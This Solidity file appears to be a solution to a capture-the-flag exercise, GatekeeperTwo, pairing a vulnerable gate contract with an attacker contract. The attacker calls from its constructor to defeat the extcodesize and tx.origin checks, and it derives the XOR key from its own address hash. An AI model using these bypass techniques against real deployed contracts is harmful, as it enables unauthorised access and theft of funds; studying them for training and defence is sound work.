// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack { // Passed gateOne()
    constructor(GatekeeperTwo target) { // Passed gateTwo()

        // Passed gateThree

        // max = 1111111111
        
        // Since we know 
        // a ^ a ^ b = b

        // Then 
        // s ^ s ^ key = s ^ max
        uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 k = s ^ type(uint64).max;
      

        bytes8 key = bytes8(k);
        require(target.enter(key), "fail");
    }
}

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}